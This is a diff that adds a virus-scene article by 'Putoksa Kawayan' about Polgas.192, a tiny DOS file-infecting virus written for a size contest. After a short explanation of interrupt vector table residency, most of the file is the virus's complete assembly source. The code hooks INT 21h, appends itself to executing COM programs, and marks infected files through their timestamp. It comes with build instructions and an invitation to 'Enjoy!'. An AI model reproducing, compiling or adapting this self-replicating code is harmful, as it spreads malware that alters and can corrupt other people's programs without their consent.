@@ -1,0 +1,267 @@
+Polgas.192 Memory Residency in the Interrupt Vector Table by Putoksa Kawayan 
+
+  
+
+The Interrupt Vector Table 
+The first 1024 (400h) bytes of memory (segment 0) are called the Interrupt Vector Table (IVT), also sometimes called as Interrupt Services Table. This table contains the addresses or vectors of the handler for the 256 interrupts, from Int 00 to Int FF. Each interrupt vector is composed of 4 bytes -- 2 bytes for the segment and 2 bytes for the offset in the segment. 
+
+Polgas 
+Polgas is my entry to Lord Julus' less-than-200-bytes-virus contest (which I decided to join when I found it hard to sleep one Sunday night.) Since length is the criterion, I decided to let it reside in IVT to scrimp on bytes. This is only an exercise in writing a short TSR program. The source code presented in this article is that of Polgas.192, a why-did-not-I-think-of-that modification of the original entry, Polgas.198. 
+
+The offset where it resides in IVT (IvtRes) is arbitrary. Thus it can be changed at your discretion as long as these are not in use by the hardware, operating system and other programs. Otherwise, the virus will not install in memory because of the way it detects prior memory residency. 
+
+Polgas only replicates and does nothing else. It appends itself to executing programs that have near jump (E9h) as their first instruction. To avoid reinfecting a program, Polgas marks the second field of the program's time stamp with 10h. Thus all infected programs will have 16 (10h) in the second field of their time stamp. All executing programs with this value in their time stamp are considered infected whether this is true or not. 
+
+To scrimp on bytes some more, error interrupt handler was not set up, and error checking and check for the exec programs attribute are not performed. Error messages are therefore expected to pop out when an attempt is made to infect programs on write-protected disks or those with read-only attribute. 
+
+Since the old interrupt handler is invoked through an INT call, you should make sure that the offset where you save the original interrupt handler is dword aligned or divisible by four. 
+
+The virus is roughly based on Duwende and Kara. The IVT residency was patterned after those used by boot viruses. 
+
+Btw "polgas" is flea in english, as in dog's flea. =) It is also the name of one of my favorite comics characters. 
+
+Enjoy! 
+
+Putoksa Kawayan 
+
+
+
+--------------------------------------------------------------------------------
+
+ ;_____________________________________________________________________________
+ ;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ; Virus Name  : Polgas.192
+ ; Author      : Putoksa Kawayan
+ ; Origin      : Manila, Philippines
+ ;_____________________________________________________________________________
+ ;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ; This program listing should be compiled to EXE and could be compiled in
+ ; A86 4.02 and TASM 2.01, producing the 192-byte virus.
+ ;
+ ; Use of MASM 5.0 is not recommended because it inserts nops which would
+ ; make Old21 to fall in an address that is not dword aligned (a requirement
+ ; of the program so that it could invoke old Int 21h handler through an 
+ ; INT call).
+ ;_____________________________________________________________________________
+ ;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ ;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Virus segment
+ assume cs:Virus,ds:Virus
+ 
+ Ivt21     equ  21h*4
+ IvtRes    equ  90h*4
+ VirLen    equ  Old21-VirStart
+ CallOld21 equ  low ((IvtRes+(offset Old21-offset VirStart))/4)
+ 
+ org 0
+ ;
+ ; checks whether offsets 240h to 306h of segment 0 are unused.
+ ; this also serves as the virus' tsr self-recognition. if it 
+ ; finds a non-zero in this portion, the virus restores the
+ ; near jump displacement of the host program and passes back
+ ; control to host program's offset 100h. otherwise, it saves and
+ ; hooks int 21h prior to execution of the host program.
+ ;
+ VirStart:
+      sub  ax,ax                         ; set segment to ivt
+      mov  es,ax
+      mov  di,IvtRes                     ; set start offset to 240h
+      mov  cx,VirLen/2
+      push cx
+      push di
+      cld
+      repe scasw                         ; checks 0000:0240-0306 are unused
+      pop  di                            ; all should contain zero for the
+      pop  cx                            ; virus to go resident
+      jne  ExecuteHost
+ ;
+ ; copy virus to the interrupt vector table starting at 0000:0240
+ ;
+      mov  si,0                          ; location of virus in infected prog
+ LocVirus equ word ptr $-2
+ 
+      rep  movsw                         ; copy virus to ivt:240
+      push cx
+      push offset GoToIvt+IvtRes         ; and execute at ivt
+      retf
+ ;
+ ; save and hook int 21h
+ ;
+ GoToIvt:
+      les  ax,dword ptr cs:[Ivt21]        ; get int 21...
+      push ds
+      push cs
+      pop  ds
+      mov  [Old21Ip][IvtRes],ax           ; ...and save it
+      mov  [Old21Cs][IvtRes],es
+      mov  dx,offset DosHandler+IvtRes    ; then hook int 21
+      mov  ax,2521h
+      int  CallOld21
+      pop  ds
+ ;
+ ; restore host program's near jump displacement and execute
+ ; the host program.
+ ;
+ ExecuteHost:
+      mov  ax,0                           ; original jump displacement of host
+ HostJmpDisp equ word ptr $-2
+ 
+      mov  word ptr ds:[101h],ax          ; restore jump displacement
+      push ds
+      pop  es
+      push ds
+      push offset VirStart+100h           ; actually, this is push 100h
+      retf                                ; execute host
+ 
+ ;___________________________
+ ;=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ VirusName  db  'polgas'                  ; courtesy of Putoksa Kawayan :)
+ ;=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ ;~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ;
+ ; virus int 21h handler. the virus only infects on exec. no check is
+ ; made on the filename. instead, it reads the first three bytes of the
+ ; exec program and checks whether it is a near jump. if so, it saves
+ ; the jump displacement and replaces it with the displacement to the
+ ; end of original file. the virus is then appended to the end of the
+ ; program (of course, append == added to end :) ), then writes the
+ ; the jmp to the virus at the beginning of the program.
+ ;
+ ; the virus checks whether the exec program is already infected through
+ ; the second field of the file's time stamp. if the second field contains
+ ; 10h, the file is considered infected whether it is actually infected
+ ; or not. after infection, the virus sets FileTime.Seconds to 10h.
+ ;
+ ; the virus does not have an error interrupt handler so expect to
+ ; encounter error messages on infection attempt to files with read-only
+ ; attribute or on write-protected disks. also, error checking are
+ ; generally not performed so error messages are also probable on writes,
+ ; if not program corruption. the program, however, does not do intentional
+ ; damage. i planned an anti-av routine but couldn't include it considering
+ ; the 200 byte limit.
+ ;
+ DosHandler:
+      pushf
+      cmp  ah,4bh          ; is it exec?
+      jne  PassToDos                ; execute dos
+ 
+ ;
+ ; infection routine....
+ ;
+ isExec:
+      pusha
+      push ds
+      mov  ax,3d02h        ; open file. would not be able to infect programs
+      int  CallOld21       ; with the read-only attribute set.
+      jc   Error 
+      push cs
+      pop  ds
+      xchg bx,ax
+      mov  ax,5700h        ;
+      int  CallOld21       ;
+      and  cl,1fh          ; check for 10h seconds...
+      cmp  cl,10h          ;    first 4 bits not set?
+      je   CloseFile
+      mov  ah,3fh
+      mov  cx,3
+      mov  dx,offset Dropper+IvtRes
+      int  CallOld21
+      mov  si,dx
+      lodsb     
+      cmp  al,0e9h         ; check for near jumps
+      jne  CloseFile
+      push cx
+      push dx
+      xor  cx,cx
+      xor  dx,dx
+      mov  ax,4202h                 ; get eof of target com
+      int  CallOld21
+      add  ax,100h                  ; convert it to offset
+      mov  [LocVirus][IvtRes],ax    ; save location of virus == eof+100h
+      sub  ax,103h                  ; convert it to displacement
+      xchg [si],ax                  ; and set up jump to virus
+      mov  [HostJmpDisp][IvtRes],ax ; save original jmp displacement
+      mov  dx,IvtRes
+      mov  cx,VirLen                ; write virus to eof
+      mov  ah,40h                   ;
+      int  CallOld21                ;
+      xor  cx,cx
+      xor  dx,dx                     
+      mov  ax,4200h                 ; prepare to write jump to virus
+      int  CallOld21
+      pop  dx
+      pop  cx
+      mov  ah,40h                   ; write jump to virus to begin of file
+      int  CallOld21
+      mov  ax,5700h
+      int  CallOld21
+      inc  ax
+      and  cl,0f0h                  ; set virus infection marker
+      or   cl,10h
+      int  CallOld21
+ 
+ CloseFile:
+      mov  ah,3eh                   ; done with infect
+      int  CallOld21
+ 
+ Error:
+      pop  ds
+      popa
+ 
+ PassToDos:                ; execute old dos handler
+      popf
+      db   0eah
+ 
+ Old21 label dword         ; Old21 should be dword aligned. if DosHandler
+  Old21Ip dw  ?            ; is dword aligned Old21 will automatically
+  Old21Cs dw  ?            ; be dword aligned also, unless altered. dword
+                           ; alignment is needed so that Old21 could be 
+                           ; invoked through an "INT" call
+ 
+ ;
+ ; the virus first generation, or simply, dropper. because of the structure
+ ; of the virus entry and its behavior, it would make our life easier if
+ ; a separate routine is created for the virus' first generation. anyways,
+ ; this is a simplified version of the virus init routines. the only
+ ; difference is that there is no optimization for size and it terminates
+ ; instead of executing the host, of course.
+ ;
+ ; three bytes starting at Dropper are also used by the virus as its read
+ ; buffer when it checks the exec program for near jumps.
+ ;
+ Dropper:
+      cld
+      xor  ax,ax
+      mov  es,ax
+      mov  di,IvtRes
+      mov  cx,VirLen
+      repe scasb
+      jne  Terminate
+      push es
+      mov  ax,3521h
+      int  21h
+      mov  cs:[Old21Ip],bx
+      mov  cs:[Old21Cs],es
+      pop  es
+      push cs
+      pop  ds
+      xor  si,si
+      mov  di,IvtRes
+      mov  cx,VirLen
+      rep  movsb
+      mov  ds,cx
+      mov  dx,offset DosHandler+IvtRes
+      mov  ax,2521h
+      int  21h
+ Terminate:
+      mov  ah,4ch
+      int  21h
+ 
+ Virus ends
+ 
+ end Dropper
+
+ 
+
